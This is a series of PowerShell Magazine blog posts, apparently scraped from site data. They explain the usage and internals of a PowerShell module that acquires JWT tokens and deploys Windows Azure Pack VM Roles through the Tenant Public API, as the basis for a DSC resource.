component of Windows Azure Pack installation) a folder will be created “C:\\Program Files\\Management Service\\MgmtSvc-PowerShellAPI\\Samples\\Authentication” which contain some PowerShell example scripts to get a token from different providers. I took these example scripts and combined them into the Get-WAPToken function.\nThe scripts relies on the System.ServiceModel and System.IdentityModel assemblies to be loaded. As I created a function I did not want these assemblies to be loaded every time the function was called so I decided to load these as part of the module being imported.\nAdd-Type -AssemblyName \u0026#39;System.ServiceModel, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\u0026#39; Add-Type -AssemblyName \u0026#39;System.IdentityModel, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\u0026#39; The function will set the Token and Header variables in the “parent” scope. This makes them available for subsequent functions to consume directly instead of the need to pass the data as parameter values.\nSet-Variable -Name Headers -Scope 1 -Value @{ Authorization = \u0026#34;Bearer $Token\u0026#34; \u0026#39;x-ms-principal-id\u0026#39; = $Credential.UserName Accept = \u0026#39;application/json\u0026#39; } Set-Variable -Name Token -Value $token -Scope 1 I chose this method because almost all subsequent functions need this data. At first I took an alternative route and enriched the output object of functions with this data so I could pipe into the next function without re-specifying the values. In the end this proved to become really messy so I decided to divert from the approach.\nOn a side note: Trond Hindenes suggested using variables instead of enriched objects through a GitHub issue on my project. How cool is that! Making the move to Git and GitHub is proving to be really valuable so I encourage you, if you are not already doing so, to start looking into source control.\nConnect-WAPAPI This function is only used to set variables in the parent scope. We don’t actually connect to Azure Pack but try to see if we get results on a URL. If results are returned, the variables will be set. If an error is thrown instead, the variables will be nulled.\nWhen the IgnoreSSL switch is set, the variable IgnoreSSL in the parent scope is set to true which means all subsequent functions will ignore certificate errors.\nif ($IgnoreSSL) { Write-Warning -Message \u0026#39;IgnoreSSL switch defined. Certificate errors will be ignored!\u0026#39; #Change Certificate Policy to ignore IgnoreSSL Set-Variable -Name IgnoreSSL -Value $IgnoreSSL -Scope 1 } PreFlight $TestURL = \u0026#39;{0}:{1}/subscriptions/\u0026#39; -f $URL,$Port Write-Verbose -Message \u0026#34;Constructed Connection URL: $TestURL\u0026#34; $Result = Invoke-WebRequest -Uri $TestURL -Headers $Headers -UseBasicParsing -ErrorVariable \u0026#39;ErrCon\u0026#39; if ($Result) { Write-Verbose -Message \u0026#39;Successfully connected\u0026#39; Set-Variable -Name PublicTenantAPIUrl -Value $URL -Scope 1 Set-Variable -Name Port -Value $Port -Scope 1 } else { Write-Verbose -Message \u0026#39;Connection unsuccessfull\u0026#39; -Verbose Set-Variable -Name PublicTenantAPIUrl -Value $null -Scope 1 Set-Variable -Name Port -Value $null -Scope 1 throw $ErrCon } PreFlight (helper function) You might have seen PreFlight in the previous function code. PreFlight is a private function which means it is not exported to the user when the module is loaded. The module exports functions based on the presence of the WAP prefix (WAP), everything else is considered private.\nfunction PreFlight { [CmdletBinding()] param ( [Switch] $IncludeConnection, [Switch] $IncludeSubscription ) Write-Verbose -Message \u0026#39;Validating Token Acquired\u0026#39; if (($null -eq $Token) -or ($null -eq $Headers)) { throw \u0026#39;Token was not acquired, run Get-WAPToken first!\u0026#39; } Write-Verbose -Message \u0026#39;Validating Token not expired\u0026#39; if (!(TestJWTClaimNotExpired -Token $Token)) { throw \u0026#39;Token has expired, fetch a new one!\u0026#39; } if ($IncludeConnection) { Write-Verbose -Message \u0026#39;Validating if connection is set\u0026#39; if ($null -eq $PublicTenantAPIUrl) { throw \u0026#39;No connection has been made to API yet, run Connect-WAPAPI first!\u0026#39; } } if ($IncludeSubscription) { Write-Verbose -Message \u0026#39;Validating if subscription is selected\u0026#39; if ($null -eq $Subscription) { throw \u0026#39;No Subscription has been selected yet, run Select-WAPSubscription first!\u0026#39; } } } Because this helper function exists, it saves me from writing a lot of redundant code in other functions as almost all functions need to deal with these checks. These functions now just call this helper function and dependent on their functionality, provide additional switches to it so additional checks are done.The functions job is to check if variables have been assigned data. It throws errors if these are still null. Also, if a token has been acquired, another helper function is called to check if the token is still valid.\nConnect-WAPAPI provides no switches, so only the presence of the Token and Headers variables are checked and the Token is checked for expiration. When a function relies on Connect-WAPAPI to have already ran successfully, it will add the –IncludeConnection switch. And when a function relies on a subscription to be selected as current, it will add the –IncludeSubscription switch.\nTestJWTClaimNotExpired (Check token Expiration helper function) This helper function is actually nice to see entirely so I can give some details of what we do here.\nfunction TestJWTClaimNotExpired { param ( [Parameter(Mandatory, ValueFromPipeline, ValueFromPipelineByPropertyName)] [ValidateNotNullOrEmpty()] [String] $Token ) #based on functions by Shriram MSFT found on technet: https://gallery.technet.microsoft.com/JWT-Token-Decode-637cf001 process { try { if ($Token.split(\u0026#39;.\u0026#39;).count -ne 3) { throw \u0026#39;Invalid token passed, run Get-WAPToken to fetch a new one\u0026#39; } $TokenData = $token.Split(\u0026#39;.\u0026#39;)[1] | ForEach-Object -Process { $data = $_ -as [String] $data = $data.Replace(\u0026#39;-\u0026#39;, \u0026#39;+\u0026#39;).Replace(\u0026#39;_\u0026#39;, \u0026#39;/\u0026#39;) switch ($data.Length % 4) { 0 { break } 2 { $data += \u0026#39;==\u0026#39; } 3 { $data += \u0026#39;=\u0026#39; } default { throw New-Object -TypeName ArgumentException -ArgumentList (\u0026#39;data\u0026#39;) } } [System.Text.Encoding]::UTF8.GetString([convert]::FromBase64String($data)) | ConvertFrom-Json } #JWT Reference Time $Ref = [datetime]::SpecifyKind((New-Object -TypeName datetime -ArgumentList (\u0026#39;1970\u0026#39;,1,1,0,0,0)),\u0026#39;UTC\u0026#39;) #UTC time right now - Reference time gives amount of seconds to check against $CheckSeconds = [System.Math]::Round(([datetime]::UtcNow - $Ref).totalseconds) if ($TokenData.exp -gt $CheckSeconds) { Write-Output -InputObject $true } else { Write-Output -InputObject $false } } catch { Write-Error -ErrorRecord $_ } } } As you can see, I made a remark I borrowed some code from Shriram who actually created a set of functions to convert a JWT token into a PSCustomObject so it can be analyzed. I modified it to the module’s needs and created a helper function from it. This helper function is called for every API interacting function (PreFlight) to check up front if the JWT token is not expired. This way it is prevented that the API itself throws any error related to the token’s lifetime and we can handle these errors in a uniform way.\nA token looks like this:\nBasically the JWT token exists out of 3 parts separated by a dot (.).\nThe second part (1) contains the claim and expiration information. So we are only interesting in this part for this helper function.\nThe replacing (or normalization if you will) and additions of ‘=’ or “==” happens because the JWT tokens generated by the Azure Pack Authentication site are not entirely the same as those generated by ADFS. Because of this, the Base64 to String conversion would trip if the text was not normalized.\nOnce the second part of the JWT token is converted it can be interpreted and looks like this:\nAs you can see my UPN claim is in there as well as a number defining my expiration time (exp).\nJWT token validity is checked by calculating the amount of seconds which have passed from exactly the moment it became the first of January 1970 UTC time. So I set this as the reference time.\n$Ref = [datetime]::SpecifyKind((New-Object -TypeName datetime -ArgumentList (\u0026#39;1970\u0026#39;,1,1,0,0,0)),\u0026#39;UTC\u0026#39;) Next we need to calculate the amount of seconds which have passed since then.\n$CheckSeconds = [System.Math]::Round(([datetime]::UtcNow - $Ref).totalseconds) Now we know the amount of seconds passed, all that needs to be done is to check if the exp value of the claim is greater than the amount that passed since 1970. If this is the case, the token is still valid and we return a Boolean of true or else a Boolean of false.\nif ($TokenData.exp -gt $CheckSeconds) { Write-Output -InputObject $true } else { Write-Output -InputObject $false } Get-WAPSubscription and Select-WAPSubscription When we look at the URL constructions of other functions you will see that the subscription id is in every one of them:\n   Function Url     Get-WAPGalleryVMRole ‘{0}:{1}/{2}/Gallery/GalleryItems/$/MicrosoftCompute.VMRoleGalleryItem?api-version=2013-03’ -f $PublicTenantAPIUrl,$Port,$Subscription.SubscriptionId   Get-WAPVMRoleOSDisk ‘{0}:{1}/{2}/services/systemcenter/vmm/VirtualHardDisks’ -f $PublicTenantAPIUrl,$Port,$Subscription.SubscriptionId   Get-WAPVMNetwork ‘{0}:{1}/{2}/services/systemcenter/vmm/VMNetworks’ -f $PublicTenantAPIUrl,$Port,$Subscription.SubscriptionId   Get-WAPCloudService ‘{0}:{1}/{2}/CloudServices?api-version=2013-03’ -f $PublicTenantAPIUrl,$Port,$Subscription.SubscriptionId   Get-WAPVMRole ‘{0}:{1}/{2}/CloudServices/{3}/Resources/MicrosoftCompute/VMRoles?api-version=2013-03’ -f $PublicTenantAPIUrl,$Port,$Subscription.SubscriptionId,$CloudServiceName    This makes sense as the subscription governs everything what has been made available to the user by its association with a plan and potential add-ons.\n$URL = \u0026#39;{0}:{1}/subscriptions/\u0026#39; -f $PublicTenantAPIUrl,$Port Write-Verbose -Message \u0026#34;Constructed Subscription URL: $URL\u0026#34; $Subscriptions = Invoke-RestMethod -Uri $URL -Headers $Headers -Method Get foreach ($S in $Subscriptions) { if ($PSCmdlet.ParameterSetName -eq \u0026#39;Name\u0026#39; -and $S.SubscriptionName -ne $Name) { continue } if ($PSCmdlet.ParameterSetName -eq \u0026#39;Id\u0026#39; -and $S.SubscriptionId -ne $Id) { continue } $S.Created = [datetime]$S.Created Add-Member -InputObject $S -MemberType AliasProperty -Name \u0026#39;Subscription\u0026#39; -Value SubscriptionId $S.PSObject.TypeNames.Insert(0,\u0026#39;WAP.Subscription\u0026#39;) Write-Output -InputObject $S } When you look at the code of Get-WAPSubscription you see the basis for almost all of the other functions. It first constructs the URL to target, then it runs Invoke-RestMethod with the Get method, capturing the results. By default, most functions have a DefaultParameterSetName of ‘List’. The List parameter set is actually not implemented but this makes it really clear to the coder wat is the intention when no parameters have been provided by the end user. As you can see, filtering on the output is done based on the parameter set in use. When the parameter set in use is the List parameter set, nothing is filtered and everything is returned to the pipeline. When the parameter set is Name on the other hand, only subscriptions which have the correct name will be passed on the pipeline, skipping everything else (the continue keyword moves to the next object in the foreach loop effectively stopping execution on the current object).\nOnce the desired subscription is found, we need to provide the other functions with its subscription Id by default. Like with the Headers, Token, API URL and other data, the subscription object is captured in a parent level variable. This is done by Select-WAPSubscription function.\nif ($input.count -gt 1) { throw \u0026#39;Only 1 subscription can be selected. If passed from Get-WAPSubscription, make sure only 1 subscription object is passed on the pipeline\u0026#39; } if (!($Subscription.pstypenames.Contains(\u0026#39;WAP.Subscription\u0026#39;))) { throw \u0026#39;Object bound to Subscription parameter is of the wrong type\u0026#39; } Write-Verbose -Message \u0026#34;Setting current subscription to $($Subscription | Out-String)\u0026#34; Set-Variable -Name Subscription -Value $Subscription -Scope 1 Select-WAPSubscription does support pipeline input but does not have a process block. This is done so we are certain the user is absolutely sure which subscription gets selected. The default available input variable is checked for its count and if it’s greater than 1, an error is thrown notifying the user to be more explicit.\nWhen a usr wants to see which subscription is set, Get-WAPSubscription can be used with the –Current switch. This will output the content of the subscription variable.\nGet-WAPGalleryVMRole $URI = \u0026#39;{0}:{1}/{2}/Gallery/GalleryItems/$/MicrosoftCompute.VMRoleGalleryItem?api-version=2013-03\u0026#39; -f $PublicTenantAPIUrl,$Port,$Subscription.SubscriptionId Write-Verbose -Message \u0026#34;Constructed Gallery Item URI: $URI\u0026#34; $GalleryItems = Invoke-RestMethod -Uri $URI -Headers $Headers -Method Get foreach ($G in $GalleryItems.value) { if ($PSCmdlet.ParameterSetName -eq \u0026#39;Name\u0026#39; -and $G.Name -ne $Name) { continue } if ($Version -and $G.Version -ne $Version) { continue } $GIResDEFUri = \u0026#39;{0}:{1}/{2}/{3}/?api-version=2013-03\u0026#39; -f $PublicTenantAPIUrl,$Port,$Subscription.SubscriptionId,$G.ResourceDefinitionUrl Write-Verbose -Message \u0026#34;Acquiring ResDef from URI: $GIResDEFUri\u0026#34; $ResDef = Invoke-RestMethod -Uri $GIResDEFUri -Headers $Headers -Method Get $GIViewDefUri = \u0026#39;{0}:{1}/{2}/{3}/?api-version=2013-03\u0026#39; -f $PublicTenantAPIUrl,$Port,$Subscription.SubscriptionId,$G.ViewDefinitionUrl Write-Verbose -Message \u0026#34;Acquiring ViewDef from URI: $GIResDEFUri\u0026#34; $ViewDef = Invoke-RestMethod -Uri $GIViewDefUri -Headers $Headers -Method Get Add-Member -InputObject $G -MemberType NoteProperty -Name ResDef -Value $ResDef Add-Member -InputObject $G -MemberType NoteProperty -Name ViewDef -Value $ViewDef $G.PublishDate = [datetime]$G.PublishDate $G.PSObject.TypeNames.Insert(0,$G.\u0026#39;odata.type\u0026#39;) Write-Output -InputObject $G } When looking at the code for Get-WAPGalleryVMRole you can see how we ended up with all the information we needed to construct our ResDef JSON with.\nAt first the URL is constructed to acquire the GalleryItems. Every item which is returned has a ResourceDefinitionUrl and ViewDefinitionUrl property. The API effectively told us where to find the info we need to deploy the VM Role with. Thankfully making use of the information, two other URLs are constructed and called. The information which is returned is added to the output object by making use of the Add-Member cmdlet before outputting the object on the pipeline. Now other functions, like Get-WAPVMRoleOSDisk and New-WAPVMRoleParameterObject, can make use of the all this data.\nNew-WAPVMRoleParameterObject Now we have the data which came with the Gallery Item object (and some other functions, see part 2 of this series), we need to fill in the missing (user specific) data needed to deploy the VM Role. What needs to filled in is mandatorily exposed to the View Definition so I created this function, New-WAPVMRoleParameterObject, to deal with this task.\nFirst the View Definition parameters are captured in a variable. Then each parameter is going through a foreach loop. If the -Interactive switch is enabled by the user, he will be prompted to provide values depending on the property to be of the “Option” or “Credential” type and for everything that will be left blank after not matching any of the elseif clauses. When it is not run in “interactive mode”, everything missing will have null as a value.\nNew-WAPVMRoleDeployment I want to close this post with the function that handles the most important task, the deployment.\nfunction New-WAPVMRoleDeployment { \u0026lt;# .SYNOPSISDeploys VM Role to a Cloudservice using Azure Pack TenantPublic or Tenant API. .PARAMETERCloudServiceName The name of the cloud service to provision to. If it does not exist, it will be created. // Removed the rest to shorten code in blog post #\u0026gt; [CmdletBinding(SupportsShouldProcess=$true)] [OutputType([PSCustomObject])] param ( [Parameter(Mandatory)] [ValidateNotNull()] [PSCustomObject] $VMRole, [Parameter(Mandatory)] [ValidateNotNull()] [PSCustomObject] $ParameterObject, [Parameter(Mandatory, ValueFromPipelineByPropertyName)] [Alias(\u0026#39;Name\u0026#39;,\u0026#39;VMRoleName\u0026#39;)] [ValidateNotNullOrEmpty()] [String] $CloudServiceName ) process { $ErrorActionPreference = \u0026#39;Stop\u0026#39; if (!($VMRole.pstypenames.Contains(\u0026#39;MicrosoftCompute.VMRoleGalleryItem\u0026#39;))) { throw \u0026#39;Object bound to VMRole parameter is of the wrong type\u0026#39; } if (!($ParameterObject.pstypenames.Contains(\u0026#39;WAP.ParameterObject\u0026#39;))) { throw \u0026#39;Object bound to ParameterObject parameter is of the wrong type\u0026#39; } $ParameterObject | Get-Member -MemberType Properties | ForEach-Object -Process { if ($null -eq $ParameterObject.($_.name)) { throw \u0026#34;ParameterObject property: $($_.name)is NULL\u0026#34; } } try { if ($IgnoreSSL) { Write-Warning -Message \u0026#39;IgnoreSSL defined by Connect-WAPAPI, Certificate errors will be ignored!\u0026#39; #Change Certificate Policy to ignore IgnoreSSL } PreFlight -IncludeConnection -IncludeSubscription if ($PSCmdlet.ShouldProcess($CloudServiceName)) { Write-Verbose -Message \u0026#34;Testing if Cloudservice $CloudServiceName exists\u0026#34; if (!(Get-WAPCloudService -Name $CloudServiceName)) { Write-Verbose -Message \u0026#34;Creating Cloudservice $CloudServiceName as it does not yet exist\u0026#34; New-WAPCloudService -Name $CloudServiceName | Out-Null $New = $true } else { $New = $false } if (!$New) { Write-Verbose -Message \u0026#34;Testing if VMRole does not already exist within cloud service\u0026#34; if (Get-WAPCloudService -Name $CloudServiceName | Get-WAPVMRole) { throw \u0026#34;There is already a VMRole deployed to the CloudService $CloudServiceName. Because this function mimics portal experience, only one VM Role is allowed to exist per CloudService\u0026#34; } } #Add ResDefConfig JSON to Dictionary $ResDefConfig = New-Object -TypeName \u0026#39;System.Collections.Generic.Dictionary[String,Object]\u0026#39; $ResDefConfig.Add(\u0026#39;Version\u0026#39;,$VMRole.version) $ResDefConfig.Add(\u0026#39;ParameterValues\u0026#39;,($ParameterObject | ConvertTo-Json)) # Set Gallery Item Payload Info $GIPayload = @{ InstanceView = $null Substate = $null Name = $CloudServiceName Label = $CloudServiceName ProvisioningState = $null ResourceConfiguration = $ResDefConfig ResourceDefinition = $VMRole.ResDef } # Convert Gallery Item Payload Info To JSON $GIPayloadJSON = ConvertTo-Json -InputObject $GIPayload -Depth 10 # Deploy VM Role to cloudservice $URI = \u0026#39;{0}:{1}/{2}/CloudServices/{3}/Resources/MicrosoftCompute/VMRoles/?api-version=2013-03\u0026#39; -f $PublicTenantAPIUrl,$Port,$Subscription.SubscriptionId,$CloudServiceName Write-Verbose -Message \u0026#34;Constructed VMRole Deploy URI: $URI\u0026#34; Write-Verbose -Message \u0026#34;Starting deployment of VMRole $VMRoleName to CloudService $CloudServiceName\u0026#34; $Deploy = Invoke-RestMethod -Uri $URI -Headers $Headers -Method Post -Body $GIPayloadJSON -ContentType \u0026#39;application/json\u0026#39; $Deploy.PSObject.TypeNames.Insert(0,\u0026#39;WAP.VMRole\u0026#39;) Write-Output -InputObject $Deploy } } catch { if ($New) { Get-WAPCloudService -Name $CloudServiceName | Remove-WAPCloudService -Force } Write-Error -ErrorRecord $_ } finally { #Change Certificate Policy to the original if ($IgnoreSSL) { [System.Net.ServicePointManager]::CertificatePolicy = $OriginalCertificatePolicy } } } } The input objects are checked if they contain the correct type information. I added type information to a lot of objects so I could do exactly this. A side benefit I also utilize is that I can use format.ps1xml because of this as well. Many objects returned by the API exist out of a lot of properties which are not directly valuable for the user so I defined custom list views in the format.ps1xml file.\nThis results in the following view:\nElse it would have looked like this:\nBecause the module emulates portal behavior, the subscriptions is checked if a cloud service already exists with the name specified by the user. If this is the case, the cloud service is checked to contain a VM Role deployment and an error is thrown when this is the case. An empty cloud service is fine to continue. When no cloud service exists with the provided name, it is created on the spot.\nNext the body of the API call is created.\n#Add ResDefConfig JSON to Dictionary $ResDefConfig = New-Object -TypeName \u0026#39;System.Collections.Generic.Dictionary[String,Object]\u0026#39; $ResDefConfig.Add(\u0026#39;Version\u0026#39;,$VMRole.version) $ResDefConfig.Add(\u0026#39;ParameterValues\u0026#39;,($ParameterObject | ConvertTo-Json)) # Set Gallery Item Payload Info $GIPayload = @{ InstanceView = $null Substate = $null Name = $CloudServiceName Label = $CloudServiceName ProvisioningState = $null ResourceConfiguration = $ResDefConfig ResourceDefinition = $VMRole.ResDef } # Convert Gallery Item Payload Info To JSON $GIPayloadJSON = ConvertTo-Json -InputObject $GIPayload -Depth 10 Then a hash table is constructed which will form the actual body. It contains the justly created dictionary object, original resource definition and the cloud service name provided by the user. Finally, the hash table is converted into JSON (this would be the resdef needed by the Azure New-WAPackVMRole cmdlet).First a dictionary object is created and both the Gallery Item (VMRole) version and the generated parameter object is added to its properties respectively.\nFinally, the VM Role deployment is started and a resulting object is put on the pipeline.\n$Deploy = Invoke-RestMethod -Uri $URI -Headers $Headers -Method Post -Body $GIPayloadJSON -ContentType \u0026#39;application/json\u0026#39; $Deploy.PSObject.TypeNames.Insert(0,\u0026#39;WAP.VMRole\u0026#39;) Write-Output -InputObject $Deploy You might have noticed that these are not all the functions available in the module. I think the most important ones are described here that might give you an idea of what investment was needed to create all this.\nBesides this, the reason for this series is to show you how easy it is to create a DSC resource on top of an already developed module and to hopefully make you aware where your investments should be.\nI could have created a DSC resource containing all the code now embodied into this module but then this code would only be usable when a VM Role would be deployed through DSC. Now, because I developed the code as a normal PowerShell module first, the code can not only be used by the DSC resource, but by many other applications as well (e.g. PowerShell session, SMA, etc).\nIn the next (and final) post, I’ll show you how I’ve developed a DSC resource on top of the PowerShell module.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/09/01/journey-to-a-windows-azure-pack-vm-role-dsc-resource-inside-the-module/","tags":["Azure Pack","PowerShell DSC"],"title":"Journey to a Windows Azure Pack VM Role DSC Resource: Inside the module"},{"categories":["Azure Pack","PowerShell DSC"],"contents":"In this series,\nPart 1 - Journey to a Windows Azure Pack VM Role DSC Resource: Introduction\nPart 2 - Journey to a Windows Azure Pack VM Role DSC Resource: PowerShell module usage (this article)\nPart 3 - Journey to a Windows Azure Pack VM Role DSC Resource: Inside the module\nPart 4 - Journey to a Windows Azure Pack VM Role DSC Resource: The DSC resource\nIn the [previous post][1] you have seen that there is no DSC resource yet to deploy Windows Azure Pack VM Roles with. Also you have seen that using the Azure PowerShell module still leaves some blank spots which makes it a bit difficult to use. The dependency on the publish settings file is another factor which make the use of Azure PowerShell module not the ideal solution for every scenario.\nIn this article we take a look at VM Role deployment using my PowerShell module which should be making all this a bit easier.\nWindows Azure Pack Tenant and Tenant Public API Windows Azure Pack has 2 API’s dealing with tenant operations.\n The Tenant API is considered a highly privileged API and should not be exposed to the public internet. The Tenant Public API. As the name implies, the API to expose publicly.  The Tenant API by default listens on port 30005 and has a self-signed certificate assigned. The Tenant Public API by default listens on port 30006 and has a self-signed certificate assigned as well. Since the nature of the Tenant Public API is to serve publicly, it will most likely be reconfigured to listen on port 443 and have a commercially signed certificate bound. The PowerShell module has to be able to deal with these scenarios and based on user choice ignore errors with certificates or not.\nPrerequisites For the module to work against the Windows Azure Pack Tenant Public API we need to configure the API to accept bearer tokens together with certificates. By default, the API is configured in what is known as “Native” mode. We need to configure it in Hybrid mode to work with the bearer tokens.\nRun the following code on all the servers hosting the Tenant Public API:\nUnprotect-MgmtSvcConfiguration -Namespace tenantpublicapi Set-WebConfigurationProperty -PSPath IIS:\\Sites\\MgmtSvc-TenantPublicAPI -Filter \u0026#34;appSettings/add[@key=\u0026#39;TenantServiceMode\u0026#39;]\u0026#34; -Name \u0026#39;value\u0026#39; -Value \u0026#39;HybridTenant\u0026#39; Protect-MgmtSvcConfiguration -Namespace tenantpublicapi The change is effective immediately, no need to restart IIS or anything.\nThe Tenant API works out of the box with bearer tokens, so no need to change configurations.\nFrom my experience, some permissions are missing in the Azure Pack Store database for the Tenant Public API to function correctly under Hybrid mode. Specifically means to check on invalidated user tokens. To fix this, run the following TSQL code against the database:\nUSE [Microsoft.MgmtSvc.Store] GO Grant Execute On Type::.mp.CoAdminTableType To mp_TenantAPI Grant Execute On Object::mp.GetInvalidatedUserTokens To mp_TenantAPI The PowerShell module As I wrote in the previous article, the module discussed here can be downloaded from GitHub or from the PowerShell gallery, if you have WMF5 installed, by running Install-Module WAPTenantPublicAPI.\nExample deployment This article focuses on getting you familiar with the module. In the next article I will highlight some code used in this module. First have a look at an example script which uses the functions from this module and go from there.\nGet-WAPToken -Url https://sts.bgelens.nl -ADFS -Credential administrator@gelens.int Connect-WAPAPI -Url https://api.bgelens.nl -Port 443 Get-WAPSubscription -Name Test | Select-WAPSubscription $GI = Get-WAPGalleryVMRole -Name DSCPullServerClient $OSDisk = $GI | Get-WAPVMRoleOSDisk | Sort-Object -Property AddedTime -Descending | Select-Object -First 1 $NW = Get-WAPVMNetwork -Name internal $VMProps = New-WAPVMRoleParameterObject -VMRole $GI -OSDisk $OSDisk -VMRoleVMSize Medium -VMNetwork $NW $VMProps.VMRoleAdminCredential = \u0026#39;Administrator:Welkom01\u0026#39; $VMProps.DSCPullServerClientCredential = \u0026#39;Domain\\Certreq:password\u0026#39; $VMProps.DSCPullServerClientConfigurationId = \u0026#39;7844f909-1f2e-4770-9c97-7a2e2e5677ae\u0026#39; New-WAPVMRoleDeployment -VMRole $GI -ParameterObject $VMProps -CloudServiceName MyCloudService Get-WAPCloudService -Name MyCloudService | Get-WAPVMRole First you acquire the token by authenticating against either the Windows Azure Pack authentication website or ADFS (use the –ADFS switch in this case) using the Get-WAPToken function.\nThis function will populate some variables (Token and Headers) defined in the module level so other functions can now access the data. The Headers variable will contain a hash table once successfully authenticated.\n@{ Authorization = \u0026#34;Bearer $Token\u0026#34; \u0026#39;x-ms-principal-id\u0026#39; = $Credential.UserName Accept = \u0026#39;application/json\u0026#39; } These headers are used with each subsequent function which target the API. It tells the API:\n  To handle Bearer token authentication and supplies the JWT token as a value.\nThe API will check the claims and other validating data from the token.\n  The principal identifier (who you are)\nIt is the same as the credential used to acquire the JWT token (someone@somedomain.tld).\n  The client (invoker) understands JSON and wants to retrieve the potential return data as JSON.\nWhen the API is not told the client is capable to deal with JSON, a lot less data is returned.\n  Next we “connect” with Windows Azure Pack using the Connect-WAPAPI function.\nThis function actually just checks if we can successfully access the subscription URL using the headers and bearer token. When this is the case, some module-scoped variables will be populated with data (PublicTenantAPIUrl, Port, and IgnoreSSL). Subsequent functions will check if these variables are $null or have data before executing the code intended. If $null, an exception will be thrown telling you to first “connect”.\nJust like the Azure PowerShell module, the subscription is the basis for operations in this module. We get a specific subscription (Get-WAPSubscription) and make it the current one by piping it to Select-WAPSubscription. This will populate the last module-scoped variable, Subscription. Now everything is in place to interact with the API.\nA subscription is bound to a plan. VM Roles come as gallery items and are assigned to a subscription via the plan or via add-ons. To know which VM Roles are available to us, we need to interrogate the API. We do this with the Get-WAPGalleryVMRole function. Once we know which one we want to deploy, we specifically look it up by specifying the name and, if multiple versions are available, by version. The resulting object is stored in a variable as it contains most of the info we need to generate the required JSON for the resource definition.\nThe tags used to lookup the Operating System disks are part of the view definition which was acquired by getting the VM Role gallery item.\nTherefore, the gallery item object is passed to the Get-WAPVMRoleOSDisk function. On the right hand side of the pipeline we sort the resulting objects based on their AddedTime property and select the first one effectively selecting the latest one. The output is captured in a variable as it contains some info we need to generate the JSON for the resource definition later on.\nNext we find out what networks are available for our VM Role deployment using the Get-WAPVMNetwork function. VM Networks are assigned to a subscription on the plan or add-on level by the Azure Pack Admin. Besides this, a tenant is able to create VM Networks themselves. The output is again stored in a variable as we need it in the next phase.\nMost of what you have seen until now can all be achieved by using the Azure module itself. The biggest difference being the VM Role gallery item with its properties. The API provides you all that you need to construct the correct JSON for the resource definition but the Azure module apparently was not designed to handle this. Now let’s start creating that JSON. The New-WAPVMRoleParameterObject function handles what would normally be done by the view definition wizard in the tenant portal.\nFirst look at the help for the function.\nAs you can see this function has the -Interactive switch parameter. When you deal with a VM Role for the first time, you probably want to run it in the Interactive mode as it will prompt you to fill in certain types of values and provide you with default selections for option parameters. To better show this, look at the screenshot below.\nYou provide the function with all objects it requires which were gathered before:\n VM Role Gallery Item object VM Role compatible OSDisk VM Network available on the subscription  Also specified is the VM Role VM Size from which the value is taken from a validation set.\nThen, because we specified the -Interactive switch, the function starts to prompt you for missing information. Properties which require credentials for example will ask you to enter credentials in a certain format. The input is checked for proper formatting (domain\\Username:Password or Username:Password) and if it would be invalid, the user would be prompted again.\nTo give you a visual reference, in the tenant portal it would like this:\nAll parameters which have defaults defined will not prompt the user but instead, go with the defaults. Properties which do not have defaults configured will prompt the user for input.\nIf properties are of the “option” type, the default value will be offered as default and the option values will be enumerated so the user can type in a correct value (which is checked to be valid).\nTo give you a visual reference, in the tenant portal a property of the type option would like this:\n(Note: Because the VM Role Gallery Item is very flexible in the way it can be constructed; this function probably does not deal with every possible scenario. If you find your VM Role can’t be deployed with this module, the cause probably lies in the New-WAPVMRoleParameterObject function. If this is that case, please log a detailed incident on [GitHub][2] or fork the project and do a pull request of the modified code.)\nNow if we run this function without the -Interactive switch you will see we have a few blanks.\nThese are left with a $null value as we have no way to know what should be in them up front. The values have to be provided after the object is generated. This mode is of course the mode you want to use when you know what the VM Role properties need to be and deploy the VM Role using a script, SMA runbook or through the use of a DSC resource for example.\nNow we have the parameter object we can deploy the VM Role using the function New-WAPVMRoleDeployment. This function requires you to pass the VM Role gallery item object, the parameter object which was just generated and enriched, and finally a cloud service name. The function will construct the JSON payload and sends it to the API.\nI’ve designed the function to behave similar to the Windows Azure Pack tenant portal which means, a cloud service can only contain one VM Role (which could contain multiple VM instances) and it has the same name as the cloud service. Technically we could provision multiple VM Roles to the same cloud service but I feel because the tenant portal RP was not designed to handle this, we should avoid this.\nFinally, we can monitor for the deployment to finish using Get-WAPCloudService.\nAnd if we want, we can remove the deployment by running Get-WAPCloudService and piping the result to Remove-WAPCloudService.\nIn the next article, I will show some of the inner workings of the module so you have a better understanding of what is going on.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/08/07/journey-to-a-windows-azure-pack-vm-role-dsc-resource-powershell-module-usage/","tags":["Azure Pack","PowerShell DSC"],"title":"Journey to a Windows Azure Pack VM Role DSC Resource: PowerShell Module Usage"},{"categories":["Azure Pack","PowerShell DSC"],"contents":"In this series,\nPart 1 – Journey to a Windows Azure Pack VM Role DSC Resource: Introduction (this article)\nPart 2 – Journey to a Windows Azure Pack VM Role DSC Resource: PowerShell module usage\nPart 3 - Journey to a Windows Azure Pack VM Role DSC Resource: Inside the module\nPart 4 - Journey to a Windows Azure Pack VM Role DSC Resource: The DSC resource\nIn this series, I’ll take you on a journey of developing a DSC resource to deploy Windows Azure Pack VM Roles. There is already the xAzurePack DSC resource module created by Microsoft. It deals with deployment and configuration of Windows Azure pack itself and not with tenant operations like deploying VM Roles.\nWhy should you want to do this with a DSC resource? Well, the DSC resource actually is a side effect of a PowerShell module I’ve created to make it easier and a whole lot faster to mass deploy VM Roles without clicking through the tenant portal UI. Once you have a good PowerShell module, why not take the extra mile and lay a DSC resource on top to enable VM Role as Code deployments!\nI’ve created this DSC resource as an experiment. Other resources which would be obvious for this resource module are “missing” because I’ve only focused on VM Roles. In other words, you will have to go in as the tenant and setup your VM Network manually if the Azure Pack Admin did not provide one for you already.\nIf you want this “experiment” to be developed more, please visit the PowerShell module repository on GitHub here and the DSC resource module here. You can log issues or contribute by forking and creating a pull request (if you want to learn how to do that, please look at an excellent set of articles by Ravikanth Chaganti starting here). This way I know if there is any interest to promote these modules from experiment to a more generic asset.\nIf you want to get started deploying VM Roles to Windows Azure Pack right away and you use WMF 5.0 you can get both–the PowerShell module and the DSC module–via the PowerShell Gallery.\nInstall-Module -Name WAPTenantPublicAPI Install-Module -Name CWAPack If you are on an older version, go to the GitHub repositories and download them as ZIP files. And then, unblock the ZIP archives 